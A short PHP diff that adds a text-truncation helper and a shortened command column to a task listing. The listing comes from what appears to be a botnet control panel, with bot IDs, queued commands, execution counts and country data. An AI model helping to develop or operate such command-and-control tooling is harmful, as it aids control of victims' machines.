@@ -190,6 +190,25 @@ Botshop Proift btc $
         return $str;
     }
 
+    private function shorter($text, $chars_limit)
+    {
+        // Check if length is larger than the character limit
+        if (strlen($text) > $chars_limit)
+        {
+            // If so, cut the string at the character limit
+            $new_text = substr($text, 0, $chars_limit);
+            // Trim off white space
+            $new_text = trim($new_text);
+            // Add at end of text ...
+            return $new_text . "...";
+        }
+        // If not just return the text as is
+        else
+        {
+            return $text;
+        }
+    }
+
     public function tasks($botid = ""){
             $GLOBALS["template"][0] ="Main";
             $GLOBALS["template"][1] ="tasks";
@@ -238,6 +257,7 @@ Botshop Proift btc $
             $sql = "SELECT COUNT(tasks_completed.id) as executions, tasks.* FROM tasks LEFT JOIN tasks_completed ON tasks.id = tasks_completed.taskid GROUP BY tasks.id";
             $allTasks = array();
             foreach ($GLOBALS["pdo"]->query($sql) as $row) {
+               $row["command_short"] = $this->shorter($row["command"],20);
                $allTasks[] = $row;
             }
             $countries = array();
